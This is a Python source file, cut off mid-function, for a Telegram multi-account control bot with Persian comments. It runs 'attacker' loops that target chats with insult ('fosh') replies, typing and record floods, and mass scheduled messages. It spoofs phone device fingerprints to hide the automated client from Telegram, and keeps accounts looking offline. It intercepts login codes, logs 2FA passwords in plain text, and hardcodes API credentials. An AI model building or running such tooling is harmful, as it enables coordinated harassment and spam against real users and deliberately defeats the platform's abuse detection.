# eliot_groups_final_modified.py
# Modified version with requested features:
# - Multi-ID support for setid/globalsetid and delid/globaldelid
# - setenemy support for GIF replies (setenemygif) and normal text enemies
# - addfosh_media support (save replied media to sessions/<session>_media_<n>) and auto-send of media
# - simple Auto Typing / Auto Record flags per-session (autotyping, autorecord)
# - Online Status Checker command (onlinestatus) that reports basic health of accounts
# - Help texts separated for OWNER and CLIENT preserved and updated ("account" wording)
# - Commands scoped so group owners/admins operate only on their group's accounts
# NOTE: This file is an edited superset of the original. Test in safe env before production.

from __future__ import annotations
import os
import sys
import json
import asyncio
import logging
import re
import random
import tempfile
import time
from datetime import datetime, timedelta
from typing import Optional, Dict, Any, Set, List

import pytz
from telethon import TelegramClient, events, functions, types
from telethon.errors import (SessionPasswordNeededError, MessageIdInvalidError,
                              RPCError, FloodWaitError, UserBannedInChannelError,
                              ChatWriteForbiddenError, PeerFloodError)
from telethon.tl.functions.messages import SetTypingRequest, DeleteScheduledMessagesRequest, GetScheduledHistoryRequest
from telethon.tl.types import (
    SendMessageTypingAction, SendMessageRecordAudioAction,
    SendMessageUploadVideoAction, SendMessageChooseStickerAction,
    SendMessageRecordRoundAction, SendMessageUploadDocumentAction,
    InputMediaDice,
)

# -------------------------
# CONFIG (set these env variables before running)
# -------------------------
API_ID = int(os.environ.get("TIIMER_API_ID", "12010248"))
API_HASH = os.environ.get("TIIMER_API_HASH", "25692897cdcab37afe96cf89e18b8f8d")
OWNER_ID = int(os.environ.get("TIIMER_OWNER_ID", "8801803105"))
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

# همه فایل‌های دائمی باید نسبت به محل خود اسکریپت resolve شوند، نه cwd.
# در ری‌استارت‌های خودکار یا اجرای ZIP، cwd ممکن است متفاوت باشد.
PROJECT_DIR = os.path.dirname(os.path.abspath(__file__))

ADMINS = {OWNER_ID}
GLOBAL_ADMINS: Set[int] = set()
CO_OWNERS: Set[int] = set()   # اونرهای اضافه شده توسط اونر اصلی

DATA_DIR     = os.path.join(PROJECT_DIR, "data")
SESSIONS_DB  = os.path.join(DATA_DIR, "sessions.json")
SESSIONS_DIR = os.path.join(PROJECT_DIR, "sessions")
GROUPS_DB    = os.path.join(DATA_DIR, "groups.json")
TWOFA_LOG    = os.path.join(DATA_DIR, "twofa_log.txt")
BLACKLIST_DB  = os.path.join(DATA_DIR, "blacklist.json")
DISABLED_DB   = os.path.join(DATA_DIR, "disabled_sessions.json")
CO_OWNERS_DB  = os.path.join(DATA_DIR, "co_owners.json")
TRUSTED_DEVICES_DB = os.path.join(DATA_DIR, "trusted_devices.json")
GHOST_MODE_DB      = os.path.join(DATA_DIR, "ghost_mode.json")
FINGERPRINT_DB     = os.path.join(DATA_DIR, "fingerprints.json")
PRIVACY_HARDENING_DB = os.path.join(DATA_DIR, "privacy_hardening.json")

os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(SESSIONS_DIR, exist_ok=True)

def sess_path(name: str) -> str:
    os.makedirs(SESSIONS_DIR, exist_ok=True)
    return os.path.join(SESSIONS_DIR, name)

def save_2fa_to_file(sess: str, phone: str, pwd: str) -> None:
    """ذخیره رمز 2FA در فایل لاگ."""
    try:
      os.makedirs(DATA_DIR, exist_ok=True)
      line = f"{datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} | sess={sess} | phone={phone} | 2fa={pwd}\n"
      with open(TWOFA_LOG, "a", encoding="utf-8") as f:
          f.write(line)
    except Exception:
      pass

def grp_sess_path(group_name: str, name: str) -> str:
    # Sanitize both components to prevent path traversal attacks
    _safe_gname = re.sub(r'[^A-Za-z0-9_\-]', '_', group_name)
    _safe_name  = re.sub(r'[^A-Za-z0-9_\-]', '_', os.path.basename(name))
    d = os.path.join(SESSIONS_DIR, _safe_gname)
    os.makedirs(d, exist_ok=True)
    return os.path.join(d, _safe_name)

def tmp_sess_path(name: str) -> str:
    d = os.path.join(SESSIONS_DIR, "tmp")
    os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)

async def _ensure_burn_client_prewarmed() -> None:
    """Pool of _BURN_POOL_SIZE pre-connected MemorySession clients for zero-delay OTP burn.
    هر فراخوانی یه slot خالی در pool پر می‌کنه (تا سقف _BURN_POOL_SIZE)."""
    async with _burn_pool_lock:
        while len(_burn_pool) < _BURN_POOL_SIZE:
            try:
                from telethon.sessions import MemorySession
                client = TelegramClient(MemorySession(), API_ID, API_HASH)
                await asyncio.wait_for(client.connect(), timeout=20)
                _burn_pool.append(client)
            except Exception as e:
                log.warning(f"[burn prewarm] failed to fill pool slot: {e}")
                break  # retry on next call

async def _acquire_prewarmed_burn_client() -> Any:
    """Pool-aware acquire: یه کلاینت از pool می‌گیره و بلافاصله slot جدید می‌سازه."""
    async with _burn_pool_lock:
        # پیدا کردن اولین کلاینت سالم
        while _burn_pool:
            client = _burn_pool.pop(0)
            if client.is_connected():
                break
            # کلاینت قطع‌شده — دور بنداز
        else:
            client = None
    # slot جدید در بکگراند
    asyncio.create_task(_ensure_burn_client_prewarmed())
    if client and client.is_connected():
        return client
    # fallback slow-path (نادر: pool خالی بود)
    from telethon.sessions import MemorySession
    client = TelegramClient(MemorySession(), API_ID, API_HASH)
    await asyncio.wait_for(client.connect(), timeout=20)
    return client

# ── Protected clients: سشن‌های خاموش که برای burn/guard زنده نگه داشته می‌شن ──

def _attach_burn_only_handler(client: TelegramClient, session_name: str) -> None:
    """فقط handler رهگیری OTP رو روی کلاینت ثبت می‌کنه (بدون سایر هندلرها)."""
    @client.on(events.NewMessage(from_users=777000))
    async def _prot_intercept_otp(event):
      # اگه سشن در چند گروه باشه: OR منطق — هر گروهی otp_burn داشت فعال می‌شه
      _grp_burn_prot = False
      for _pg, _pgi in groups_db.items():
          if session_name in _pgi.get("sessions", []):
              if _pgi.get("otp_burn", False):
                    _grp_burn_prot = True
                    break
      if not OTP_BURN_MODE and not _grp_burn_prot:
          return
      otp_text = event.raw_text or ""
      code_match = re.search(r'\b(\d{5,6})\b', otp_text)
      code = code_match.group(1) if code_match else "—"
      if code == "—":
          return
      info = sessions_db.get(session_name, {})
      phone = info.get("phone", "")

      # Stage 2: کد دوم رسید — sign_in برای سوزوندن کد مهاجم
      if session_name in _burn_pending:
          pend = _burn_pending.pop(session_name)
          burn_client = pend["client"]
          our_hash = pend["hash"]
          our_phone = pend["phone"]

          async def _do_burn_s2(bc, ph, cd, hsh):
              code_result = ""
              try:
                    try:
                        await bc.sign_in(ph, cd, phone_code_hash=hsh)
                        code_result = " کد مصرف شد"
                    except Exception as se:
                        es = str(se)
                        if "SessionPasswordNeeded" in es or "password" in es.lower():
                            code_result = " کد مصرف شد (2FA بلاک کرد)"
                        elif "PHONE_CODE_INVALID" in es:
                            code_result = " کد منقضی یا قبلاً مصرف شده"
                        elif "PHONE_CODE_EXPIRED" in es:
                            code_result = " کد expire شده بود"
                        else:
                            code_result = f" {es[:60]}"
              except Exception as e2:
                    code_result = f" {str(e2)[:60]}"
              finally:
                    _burn_in_progress.discard(session_name)
                    try:
                        await bc.disconnect()
                    except Exception:
                        pass
              burn_notify = (
                    f" <b>OTP Burn</b> — اکانت «{session_name}» (protected)\n"
                    f" شماره: <code>{ph}</code>\n کد: <code>{cd}</code>\n"
                    f"━━━━━━━━━━━━━━\nنتیجه: {code_result}"
              )
              try:
                    await bot_client.send_message(OWNER_ID, burn_notify, parse_mode="html")
              except Exception:
                    try:
                        await main_client.send_message(OWNER_ID, burn_notify, parse_mode="html")
                    except Exception:
                        pass
          asyncio.create_task(_do_burn_s2(burn_client, our_phone, code, our_hash))
          return

      # Stage 1: اولین OTP رسید — یه request جدید می‌زنیم تا hash مهاجم باطل بشه
      if session_name in _burn_in_progress:
          return
      _burn_in_progress.add(session_name)

      async def _do_burn_s1():
          bc = None
          try:
              bc = await _acquire_prewarmed_burn_client()
              sent = await asyncio.wait_for(bc.send_code_request(phone), timeout=20)
              _burn_gen = object()
              _burn_pending[session_name] = {"client": bc, "hash": sent.phone_code_hash,
                                                "phone": phone, "_gen": _burn_gen}

              async def _cleanup(_sn=session_name, _g=_burn_gen):
                    await asyncio.sleep(90)
                    pend = _burn_pending.get(_sn)
                    if pend and pend.get("_gen") is _g:
                        _burn_pending.pop(_sn, None)
                        _burn_in_progress.discard(_sn)
                        try:
                            await pend["client"].disconnect()
                        except Exception:
                            pass
              asyncio.create_task(_cleanup())
          except Exception as e:
              _burn_in_progress.discard(session_name)
              if bc:
                    try:
                        await bc.disconnect()
                    except Exception:
                        pass
              try:
                    err = f" <b>OTP Burn خطا</b> — «{session_name}»\n{str(e)[:80]}"
                    await bot_client.send_message(OWNER_ID, err, parse_mode="html")
              except Exception:
                    pass
      asyncio.create_task(_do_burn_s1())

async def start_protected_client(sess: str) -> None:
    """یه کلاینت سبک برای سشن خاموش می‌سازه که فقط OTP burn و session guard روش کار کنن."""
    if sess in _protected_clients:
      return
    if sess in managed:
      return
    # سشن‌های سیستمی هرگز نباید protected client بشن
    if sess in (MAIN_SESSION, "bot_session"):
      return
    session_file = os.path.join(SESSIONS_DIR, f"{sess}.session")
    if not os.path.exists(session_file):
      return
    try:
      from telethon.sessions import StringSession
      _apply_sqlite_wal_to_file(sess_path(sess))
      client = _make_client(sess_path(sess), session_name=sess, connection_retries=3, retry_delay=2)
      await asyncio.wait_for(client.connect(), timeout=15)
      if not await client.is_user_authorized():
          await client.disconnect()
          return
      _protected_clients[sess] = client
      _attach_burn_only_handler(client, sess)
      # Ghost Mode: بلافاصله آفلاین کن
      if GHOST_MODE:
          try:
              from telethon.tl.functions.account import UpdateStatusRequest as _USR_GHP
              await client(_USR_GHP(offline=True))
          except Exception:
              pass
      log.warning(f"[protected] {sess} started for burn/guard")
    except Exception as e:
      log.warning(f"[protected] failed to start {sess}: {e}")

async def stop_protected_client(sess: str) -> None:
    """کلاینت protected سشن رو قطع می‌کنه."""
    client = _protected_clients.pop(sess, None)
    if client:
      try:
          await client.disconnect()
      except Exception:
          pass

_protected_start_in_flight: set = set()  # جلوگیری از start موازی برای یه سشن

async def start_protected_client_safe(sess: str) -> None:
    """start_protected_client با guard برای جلوگیری از race condition."""
    if sess in _protected_start_in_flight:
      return
    _protected_start_in_flight.add(sess)
    try:
      await start_protected_client(sess)
    finally:
      _protected_start_in_flight.discard(sess)

async def refresh_protected_clients() -> None:
    """وقتی OTP Burn یا Session Guard تغییر می‌کنه، protected clients رو بروزرسانی می‌کنه.
    - وقتی protection لازمه: سشن‌های خاموش رو protected می‌کنه
    - وقتی protection لازم نیست: همه رو قطع می‌کنه
    - هر وقت: سشنی که الان managed شده رو از protected حذف می‌کنه
    """
    need_protection = OTP_BURN_MODE or SESSION_GUARD_ENABLED
    # اگه protected client ای الان managed شده → قطع کن
    for sess in list(_protected_clients.keys()):
      if sess in managed or sess not in manually_disabled:
          asyncio.create_task(stop_protected_client(sess))
    if need_protection:
      for sess in list(manually_disabled):
          if sess not in managed and sess not in _protected_clients:
              asyncio.create_task(start_protected_client_safe(sess))
    else:
      for sess in list(_protected_clients.keys()):
          asyncio.create_task(stop_protected_client(sess))

IRAN_TZ = pytz.timezone("Asia/Tehran")
MAIN_SESSION = "main_online"

# مسیر مطلق خود اسکریپت — برای آپدیت/بکاپ سورس
_SCRIPT_PATH = os.path.abspath(__file__)

logging.basicConfig(level=logging.WARNING, format="%(message)s")
log = logging.getLogger("eliot_groups_final")

# -------------------------
# runtime state
# -------------------------
managed: Dict[str, Dict[str, Any]] = {}
sessions_db: Dict[str, Dict[str, Any]] = {}
groups_db: Dict[str, Dict[str, Any]] = {}
pending_logins: Dict[str, Dict[str, Any]] = {}
pending_group_selection: Dict[int, Dict[str, Any]] = {}  # sender_id -> {sess, phone, groups}
og_panel_lang: Dict[int, str] = {}  # sender_id -> "fa" or "en", language of the remote-panel button labels
group_pending: Dict[int, Dict[str, Any]] = {}             # sender_id -> pending state in group bots
managed_bots: Dict[str, Any] = {}                         # group_name -> TelegramClient (group bot)
first_worker_userid: Optional[int] = None
first_worker_name: Optional[str] = None
PAUSED_BOTS = False
atk_tasks: dict = {}          # group_name -> asyncio.Task (attacker loop)
_grp_atk_loop_refs: dict = {} # group_name -> _atk_loop fn (for watchdog)
act_loop_tasks: dict = {}     # gname -> asyncio.Task (action loop)
atk_stats: dict = {}          # key -> {sent, errors, started_at, target}
_og_atk_loop_ref: dict = {}   # populated by attach_bot_handlers for watchdog
atk_live_msgs: dict = {}      # group_name -> {chat_id, msg_id}  (live stats panel)
atk_updater_tasks: dict = {}  # group_name -> asyncio.Task (live stats updater)
flood_tasks: dict = {}        # "typing_{group}" or "record_{group}" -> asyncio.Task
bot_blacklist: Set[int] = set()  # user IDs blocked from using the bot
owner_takeover_pending: Dict[str, Dict] = {}  # sess_name -> {phone, tmp_client, chat_id}
OTP_BURN_MODE: bool = False       # when True, burns incoming OTP codes via sign_in
SESSION_GUARD_ENABLED: bool = False  # when True, permanently watches & kills all foreign sessions
_session_guard_task: Optional[asyncio.Task] = None  # the global guard task
GHOST_MODE: bool = False               # when True, all sessions appear offline on Telegram
_protected_clients: Dict[str, Any] = {}  # disabled sessions kept alive only for burn/guard
TRUSTED_GUARD_DEVICES: list = []  # list of {device_model, platform, app_name} — always whitelisted in Session Guard
_burn_in_progress: Set[str] = set()  # sessions currently being burned (prevents infinite loop)
_burn_pending: Dict[str, dict] = {}  # sess_name -> {client, hash, phone} awaiting 2nd OTP
_prewarmed_burn_client: Optional[Any] = None  # kept for compat references; pool now used instead
_burn_prewarm_in_flight: bool = False
_bself_loop_tasks: Dict[str, asyncio.Task] = {}  # gname -> interval self-reply loop task
sched_tasks: Dict[str, asyncio.Task] = {}        # key -> scheduled send task
native_sched_batches: Dict[str, dict] = {}       # key -> {"sess","chat","msg_ids":[...]} native server-side scheduled batch (survives client disconnect)
bulk_refill_configs: Dict[str, dict] = {}        # gname -> {"sessions","chat","texts","interval_secs","ivl_str"} last bulk schedule config
bulk_refill_tasks:   Dict[str, asyncio.Task] = {} # gname -> running auto-refill task
anti_ban_enabled: Dict[str, bool] = {}        # sess_name -> True/False (default True)
anti_ban_notified: Set[str] = set()           # sessions already notified this runtime
manually_disabled: Set[str] = set()           # sessions manually turned off — auto-reconnect skips these
_multi_add_sel: Dict[int, Dict[str, Set[str]]] = {}  # sender_id → gname → selected sessions (multi-add flow)

# ── Scalability: shared concurrency controls ─────────────────────────────
# max concurrent Telegram API calls across ALL loops (guard + anti-ban + ghost …)
# value 25: allows 25 parallel network round-trips; above ~40 risks flood-wait storms
_TG_API_SEM: asyncio.Semaphore = asyncio.Semaphore(25)
_ATK_SEM: Dict[str, asyncio.Semaphore] = {}   # per-group attacker fan-out semaphore
_atk_grp_cache: Dict[str, Dict] = {}          # key -> {"groups": list, "ts": float}
_ATK_GRP_CACHE_TTL = 120                       # seconds — cache for group list pagination

async def _fetch_joined_groups(session_names: list) -> list:
    """
    فقط گروه‌هایی که سشن‌های داده‌شده در اون‌ها عضو هستن رو برمی‌گردونه.
    - موازی: همه سشن‌ها همزمان fetch می‌کنن
    - left=True فیلتر میشه
    - هم Chat (گروه معمولی) هم Channel با megagroup=True (سوپرگروه) پشتیبانی میشه
    - برمی‌گردونه: [(name, id), ...] مرتب‌شده بر اساس نام
    """
    from telethon.tl.types import Chat, Channel

    async def _one_session(sess: str) -> dict:
        meta = managed.get(sess)
        if not meta:
            return {}
        client = meta["client"]
        result: dict = {}

        async def _collect():
            async for dialog in client.iter_dialogs():
                entity = getattr(dialog, "entity", None)
                if entity is None:
                    continue
                # گروه‌هایی که لفت شدن رو نشون نده
                if getattr(entity, "left", False):
                    continue
                if getattr(entity, "deactivated", False):
                    continue
                # گروه معمولی (Chat)
                if isinstance(entity, Chat):
                    result[dialog.id] = dialog.name or str(dialog.id)
                # سوپرگروه (Channel با megagroup=True)
                elif isinstance(entity, Channel) and getattr(entity, "megagroup", False):
                    result[dialog.id] = dialog.name or str(dialog.id)

        try:
            await asyncio.wait_for(_collect(), timeout=45)
        except (asyncio.TimeoutError, Exception):
            pass
        return result

    # همه سشن‌ها رو موازی fetch کن
    results = await asyncio.gather(*[_one_session(s) for s in session_names],
                                   return_exceptions=True)
    merged: dict = {}
    for r in results:
        if isinstance(r, dict):
            for gid, name in r.items():
                if gid not in merged:
                    merged[gid] = name

    return sorted([(name, gid) for gid, name in merged.items()],
                  key=lambda x: (x[0] or "").lower())

# ── Reverse index: session → groups (rebuilt on every save_groups) ────────
# Avoids O(sessions × groups) inner-loop inside global_session_guard
_sess_grp_map:   Dict[str, List[str]] = {}   # sess → [gname, ...]
_sess_grp_guard: Dict[str, bool]      = {}   # sess → True if ANY group has session_guard ON
_sess_grp_td:    Dict[str, List]      = {}   # sess → combined trusted-devices from all groups

def _rebuild_sess_grp_index() -> None:
    """O(groups × sessions_per_group) — call after every groups_db mutation."""
    global _sess_grp_map, _sess_grp_guard, _sess_grp_td
    mp: Dict[str, List[str]] = {}
    gd: Dict[str, bool]      = {}
    td: Dict[str, List]      = {}
    for gname, gi in groups_db.items():
        guard_on = gi.get("session_guard", False)
        for sn in gi.get("sessions", []):
            mp.setdefault(sn, []).append(gname)
            if guard_on:
                gd[sn] = True
            elif sn not in gd:
                gd[sn] = False
            for d in gi.get("trusted_devices", []):
                if d not in td.setdefault(sn, []):
                    td[sn].append(d)
    _sess_grp_map   = mp
    _sess_grp_guard = gd
    _sess_grp_td    = td

# ── Write-coalescing: avoid blocking the event loop on every DB mutation ─
# mark_*_dirty() is O(1); _db_flush_loop() writes to disk every 500 ms in a thread
_db_dirty:     bool = False
_groups_dirty: bool = False

def mark_db_dirty() -> None:
    global _db_dirty
    _db_dirty = True

def mark_groups_dirty() -> None:
    global _groups_dirty
    _groups_dirty = True

# ── OTP Burn pool: 3 pre-warmed anonymous clients ─────────────────────────
_burn_pool:      List[Any]          = []   # ready MemorySession clients
_burn_pool_lock: asyncio.Lock       = asyncio.Lock()
_BURN_POOL_SIZE: int                = 3    # keep 3 clients warm at all times

# ── Device Fingerprint Masking ─────────────────────────────────────────────
# هر سشن یه fingerprint ثابت داره که با اسم دستگاه واقعی به تلگرام معرفی میشه
# (جلوگیری از شناسایی client پایتون/Telethon)
_session_fingerprints: Dict[str, dict] = {}

_DEVICE_PROFILES = [
    # Android
    {"device_model": "Samsung Galaxy S23",      "system_version": "Android 14.0",  "app_version": "10.14.0"},
    {"device_model": "Samsung Galaxy S22 Ultra","system_version": "Android 13.0",  "app_version": "10.13.2"},
    {"device_model": "Samsung Galaxy A54",      "system_version": "Android 13.0",  "app_version": "10.12.1"},
    {"device_model": "Xiaomi 13",               "system_version": "Android 13.0",  "app_version": "10.13.1"},
    {"device_model": "Xiaomi Redmi Note 12",    "system_version": "Android 12.0",  "app_version": "10.12.0"},
    {"device_model": "HUAWEI P60 Pro",          "system_version": "Android 12.0",  "app_version": "10.11.5"},
    {"device_model": "OnePlus 11",              "system_version": "Android 13.0",  "app_version": "10.13.0"},
    {"device_model": "Google Pixel 7",          "system_version": "Android 14.0",  "app_version": "10.14.2"},
    {"device_model": "Samsung Galaxy A34",      "system_version": "Android 13.0",  "app_version": "10.12.3"},
    {"device_model": "Xiaomi Redmi 10",         "system_version": "Android 11.0",  "app_version": "10.11.0"},
    # iOS
    {"device_model": "iPhone 15",               "system_version": "iOS 17.0",      "app_version": "9.7.0"},
    {"device_model": "iPhone 14 Pro",           "system_version": "iOS 16.6",      "app_version": "9.6.3"},
    {"device_model": "iPhone 13",               "system_version": "iOS 16.5",      "app_version": "9.6.1"},
    {"device_model": "iPhone 12 Pro Max",       "system_version": "iOS 15.8",      "app_version": "9.5.2"},
    {"device_model": "iPhone 11",               "system_version": "iOS 15.7",      "app_version": "9.5.0"},
]

def load_fingerprints() -> None:
    global _session_fingerprints
    if os.path.exists(FINGERPRINT_DB):
      try:
          with open(FINGERPRINT_DB, "r", encoding="utf-8") as f:
              _session_fingerprints = json.load(f)
      except Exception as e:
          log.warning(f"[fingerprint] load error: {e}")
          _session_fingerprints = {}

def save_fingerprints() -> None:
    try:
      _atomic_write_json(FINGERPRINT_DB, _session_fingerprints)
    except Exception as e:
      log.warning(f"[fingerprint] save error: {e}")

def _get_session_fingerprint(session_name: str) -> dict:
    """برای هر سشن یه fingerprint ثابت برمیگردونه — اگه نبود، می‌سازه و ذخیره می‌کنه."""
    if session_name not in _session_fingerprints:
      profile = random.choice(_DEVICE_PROFILES).copy()
      profile["lang_code"] = "fa"
      profile["system_lang_code"] = "fa-IR"
      _session_fingerprints[session_name] = profile
      save_fingerprints()
    return _session_fingerprints[session_name]

def _make_client(session, session_name: str = "",
                 connection_retries: int = 5, retry_delay: int = 2) -> "TelegramClient":
    """TelegramClient با fingerprint واقعی می‌سازه (جلوی شناسایی Python رو می‌گیره)."""
    fp = _get_session_fingerprint(session_name or str(session))
    kwargs: dict = {
      "connection_retries": connection_retries,
      "retry_delay": retry_delay,
      "device_model":      fp["device_model"],
      "system_version":    fp["system_version"],
      "app_version":       fp["app_version"],
      "lang_code":         fp.get("lang_code", "fa"),
      "system_lang_code":  fp.get("system_lang_code", "fa-IR"),
    }
    return TelegramClient(session, API_ID, API_HASH, **kwargs)

# ── Privacy Auto-Hardening ─────────────────────────────────────────────────
PRIVACY_HARDENING_ENABLED: bool = True

def load_privacy_hardening_setting() -> None:
    global PRIVACY_HARDENING_ENABLED
    if os.path.exists(PRIVACY_HARDENING_DB):
      try:
          with open(PRIVACY_HARDENING_DB, "r", encoding="utf-8") as f:
              PRIVACY_HARDENING_ENABLED = bool(json.load(f))
      except Exception:
          PRIVACY_HARDENING_ENABLED = True

def save_privacy_hardening_setting() -> None:
    try:
      _atomic_write_json(PRIVACY_HARDENING_DB, PRIVACY_HARDENING_ENABLED)
    except Exception as e:
      log.warning(f"[privacy] save error: {e}")

async def _apply_privacy_hardening(client: "TelegramClient", session_name: str = "") -> dict:
    """
    تنظیمات privacy اکانت رو سخت‌تر می‌کنه:
    • آخرین بازدید    → هیچکس
    • شماره تلفن      → هیچکس
    • عکس پروفایل     → آشنایان
    • فوروارد پیام‌ها  → هیچکس (جلوی لینک شدن به این اکانت رو می‌گیره)
    """
    from telethon.tl.functions.account import UpdatePrivacyRequest
    from telethon.tl.types import (
      InputPrivacyKeyStatusTimestamp,
      InputPrivacyKeyPhoneNumber,
      InputPrivacyKeyProfilePhoto,
      InputPrivacyKeyForwards,
      InputPrivacyValueDisallowAll,
      InputPrivacyValueAllowContacts,
    )
    results: dict = {}
    steps = [
      ("last_seen", InputPrivacyKeyStatusTimestamp(), [InputPrivacyValueDisallowAll()]),
      ("phone",     InputPrivacyKeyPhoneNumber(),     [InputPrivacyValueDisallowAll()]),
      ("photo",     InputPrivacyKeyProfilePhoto(),    [InputPrivacyValueAllowContacts()]),
      ("forwards",  InputPrivacyKeyForwards(),        [InputPrivacyValueDisallowAll()]),
    ]
    for label, key, rules in steps:
      try:
          await client(UpdatePrivacyRequest(key=key, rules=rules))
          results[label] = "✅"
      except Exception as _pe:
          results[label] = f"❌ {str(_pe)[:40]}"
      await asyncio.sleep(random.uniform(0.4, 0.9))
    tag = f"[{session_name}]" if session_name else ""
    log.warning(f"[privacy] {tag} hardening: {results}")
    return results

# ── Human Behavior Simulator ────────────────────────────────────────────────
_human_sim_tasks: Dict[str, asyncio.Task] = {}   # session_name → background task

# ── Trusted Devices scan cache (موقت — برای callback های کلیک روی دستگاه) ──
_td_scan_cache: Dict[int, dict] = {}

# ── پریمیوم ایموجی — document_id ها رو اینجا عوض کن ────────────────────────
_PREM: Dict[str, str] = {
    "⌨️": "5341626757038484813",
    "⏭": "5339465241732329886",
    "⏰": "5341277125225755380",
    "⏱": "5341521504569929654",
    "⏳": "5341626387671298615",
    "⏸": "5341659557703723816",
    "⏹": "5341787049512938553",
    "♻️": "5341648060076275296",
    "⚔️": "5339256484846907751",
    "⚙️": "5339151541615996185",
    "⚠️": "5341533599197834822",
    "⚡": "5341521504569929654",
    "⚪": "5341579323419669963",
    "⚫": "5341733212097885663",
    "⚽": "5341617737607164060",
    "⛔": "5339463996191813708",
    "✅": "5341412030148521916",
    "✏️": "5341439041197850636",
    "✓": "5339392931662934941",
    "❌": "5339466474387945688",
    "❓": "5341349061632995577",
    "➕": "5339393043332084091",
    "➖": "5341497998213918180",
    "➡️": "5341277125225755380",
    "🌊": "5341825141577888252",
    "🌍": "5341655026513228473",
    "🌐": "5341715083040927999",
    "🎉": "5341344672176419407",
    "🎙️": "5341761455802822565",
    "🎤": "5341579323419669963",
    "🎥": "5341414340840927842",
    "🎬": "5341395610488550532",
    "🎭": "5341427414721376689",
    "🎮": "5339259074712187700",
    "🎯": "5341734436163563435",
    "🎰": "5341706265473068934",
    "🎲": "5341621650322370106",
    "🎳": "5341553901508243071",
    "🎴": "5341269347039982070",
    "🎵": "5339463996191813708",
    "🏀": "5341384477933317994",
    "🏘": "5341734436163563435",
    "🏠": "5341520289094185485",
    "🏷": "5339466474387945688",
    "🏷️": "5341453803000441574",
    "👁": "5341625356879146788",
    "👂": "5339151541615996185",
    "👇": "5339392931662934941",
    "👑": "5341269664867561804",
    "👤": "5341280324976390181",
    "👥": "5341823041338879780",
    "👮": "5339204661771515299",
    "👶": "5341497998213918180",
    "💀": "5341299587904712750",
    "💊": "5339105886113639949",
    "💡": "5341614705360251953",
    "💬": "5341760631169102037",
    "💾": "5341466262700569646",
    "📁": "5341582725033765863",
    "📂": "5341384855890440233",
    "📄": "5339260118389238847",
    "📅": "5341338208250638516",
    "📆": "5339520874443713761",
    "📊": "5339392940252868426",
    "📋": "5339205619549222314",
    "📌": "5339574806348050975",
    "📎": "5341744293113507565",
    "📗": "5341745358265397220",
    "📘": "5341563560889690817",
    "📝": "5341525236896513046",
    "📞": "5339105886113639949",
    "📢": "5339145228014073380",
    "📤": "5341456092218010922",
    "📥": "5339264890097905242",
    "📦": "5341527740862444251",
    "📨": "5339260118389238847",
    "📱": "5341349061632995577",
    "📲": "5341577339144778343",
    "📴": "5341269664867561804",
    "📶": "5341734436163563435",
    "📹": "5341335485241373119",
    "🔀": "5341349568439137209",
    "🔁": "5341789927141028113",
    "🔄": "5341651088028217526",
    "🔍": "5339207333241171764",
    "🔐": "5341826090765660957",
    "🔑": "5341451389228822256",
    "🔒": "5341439277421047556",
    "🔓": "5339348010599986447",
    "🔔": "5341761455802822565",
    "🔕": "5341382613917513120",
    "🔗": "5339578736243126343",
    "🔙": "5341389610419238578",
    "🔞": "5341428217880259834",
    "🔢": "5341349568439137209",
    "🔥": "5339141336773701450",
    "🔴": "5341605501245340558",
    "🕐": "5341614705360251953",
    "🕒": "5341659557703723816",
    "🕓": "5341651088028217526",
    "🖼": "5339224903952379821",
    "🗑": "5341269664867561804",
    "😀": "5339465868797555559",
    "🚨": "5341626757038484813",
    "🚪": "5341428900780060533",
    "🚫": "5341416544159149717",
    "🛑": "5341395610488550532",
    "🛡": "5341772463804002252",
    "🟡": "5341439736982548073",
    "🟢": "5341273444438782286",
    "🤖": "5341703718557463048",
    "🧹": "5341274810238383423",
    "🪪": "5341456092218010922",
}

def pe(e: str) -> str:
    """پریمیوم ایموجی — emoji رو برمیگردونه؛ entity توسط _apply_custom_emoji ست می‌شه."""
    return e

def _apply_custom_emoji(html_text: str):
    """
    HTML parse (برای spoiler/bold/code) + اضافه کردن MessageEntityCustomEmoji
    برای هر emoji موجود در _PREM. اینطوری هر دو کار می‌کنن بدون نیاز به <tg-emoji>.
    """
    try:
      from telethon.extensions import html as _tl_html
      from telethon.tl.types import MessageEntityCustomEmoji
      plain, base_ents = _tl_html.parse(html_text)
      ents = list(base_ents)
      claimed: List[tuple] = []  # list of (start, end) codepoint ranges already matched

      def _overlaps(start, end):
          for s, e in claimed:
              if start < e and end > s:
                    return True
          return False

      # طولانی‌ترین کلیدها اول پردازش بشن تا وقتی یه ایموجی زیررشته‌ی
      # ایموجی دیگه‌ای هست (مثلاً "🏷" داخل "🏷️")، دو تا entity هم‌پوشان
      # برای یه کاراکتر ساخته نشه (که باعث می‌شد هم عادی هم پرمیوم دیده بشه).
      for emoji, doc_id in sorted(_PREM.items(), key=lambda kv: -len(kv[0])):
          pos = 0
          while True:
              idx = plain.find(emoji, pos)
              if idx == -1:
                    break
              end_idx = idx + len(emoji)
              if _overlaps(idx, end_idx):
                    pos = end_idx
                    continue
              off16 = len(plain[:idx].encode("utf-16-le")) // 2
              len16 = len(emoji.encode("utf-16-le")) // 2
              ents.append(MessageEntityCustomEmoji(
                    offset=off16,
                    length=len16,
                    document_id=int(doc_id),
              ))
              claimed.append((idx, end_idx))
              pos = end_idx
      return plain, ents
    except Exception:
      return html_text, []

def _patch_client_premium_emoji():
    """
    یک‌بار برای همیشه send_message/edit_message خودِ TelegramClient رو پچ می‌کنه
    تا هر پیامی که از هر جای ربات (هر bot/gbot/client) فرستاده یا ادیت میشه،
    خودکار از فیلتر _apply_custom_emoji رد بشه و هر ایموجی موجود در _PREM
    به‌صورت ایموجی پرمیوم (MessageEntityCustomEmoji) نمایش داده بشه —
    بدون نیاز به دست‌کاری تک‌تک صدها فراخوانی send_message/edit_message.
    """
    if getattr(TelegramClient, "_premium_emoji_patched", False):
      return
    _orig_send_message = TelegramClient.send_message
    _orig_edit_message = TelegramClient.edit_message

    def _inject_emoji(args, kwargs):
      args = list(args)
      text = None
      loc = None
      if isinstance(kwargs.get("message"), str):
          text = kwargs["message"]
          loc = ("kwargs",)
      elif len(args) >= 2 and isinstance(args[1], str):
          text = args[1]
          loc = ("args", 1)
      if text and kwargs.get("formatting_entities") is None:
          try:
              plain, ents = _apply_custom_emoji(text)
          except Exception:
              plain, ents = text, []
          if ents:
              if loc[0] == "kwargs":
                    kwargs["message"] = plain
              else:
                    args[1] = plain
              kwargs["formatting_entities"] = ents
